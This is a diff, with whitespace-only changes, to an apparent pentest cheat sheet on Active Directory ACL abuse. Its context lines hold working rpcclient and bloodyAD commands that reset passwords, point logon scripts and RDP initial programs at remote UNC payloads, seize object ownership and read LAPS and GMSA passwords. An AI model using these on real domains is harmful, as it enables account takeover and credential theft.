@@ -106,7 +106,7 @@ An **Access Control List (ACL)** is a collection of Access Control Entries (ACEs
 		rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user 23 target_newpwd" 
 		```
 
-* WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : 
+* WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script :
 	* Windows/Linux:
 		```ps1
 		bloodyAD --host 10.0.0.5 -d example.lab -u attacker -p 'Password123*' set object delegate scriptpath -v '\\10.0.0.5\totallyLegitScript.bat'
@@ -140,6 +140,7 @@ An **Access Control List (ACL)** is a collection of Access Control Entries (ACEs
 > This tab includes settings that, among other things, can be used to change what program is started when a user connects over the Remote Desktop Protocol (RDP) to a TS/RDSH in place of the normal graphical environment. The settings in the ‘Starting program’ field basically function like a windows shortcut, allowing you to supply either a local or remote (UNC) path to an executable which is to be started upon connecting to the remote host. During the logon process these values will be queried by the RCM process and run whatever executable is defined. - https://sensepost.com/blog/2020/ace-to-rce/
 
 :warning: The RCM is only active on Terminal Servers/Remote Desktop Session Hosts. The RCM has also been disabled on recent version of Windows (>2016), it requires a registry change to re-enable.
+
 * Windows/Linux:
 	```ps1
 	bloodyAD --host 10.10.10.10 -d example.lab -u hacker -p MyPassword123 set object vulnerable_user msTSInitialProgram -v '\\1.2.3.4\share\file.exe'
@@ -196,6 +197,7 @@ To abuse `WriteDacl` to a domain object, you may grant yourself the DcSync privi
 ## WriteOwner
 
 An attacker can update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they wants. 
+
 * Windows/Linux:
 	```ps1
 	bloodyAD --host my.dc.corp -d corp -u devil_user1 -p 'P@ssword123' set owner target_object devil_user1
@@ -210,6 +212,7 @@ This ACE can be abused for an Immediate Scheduled Task attack, or for adding a u
 ## ReadLAPSPassword
 
 An attacker can read the LAPS password of the computer account this ACE applies to.
+
 * Windows/Linux:
 	```ps1
 	bloodyAD -u john.doe -d bloody.lab -p Password512 --host 192.168.10.2 get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
@@ -222,6 +225,7 @@ An attacker can read the LAPS password of the computer account this ACE applies 
 ## ReadGMSAPassword
 
 An attacker can read the GMSA password of the account this ACE applies to.
+
 * Windows/Linux:
 	```ps1
 	bloodyAD -u john.doe -d bloody -p Password512 --host 192.168.10.2 get object 'gmsaAccount$' --attr msDS-ManagedPassword
@@ -239,6 +243,7 @@ An attacker can read the GMSA password of the account this ACE applies to.
 ## ForceChangePassword
 
 An attacker can change the password of the user this ACE applies to:
+
 * Windows/Linux:
 	```ps1
 	# Using bloodyAD with pass-the-hash
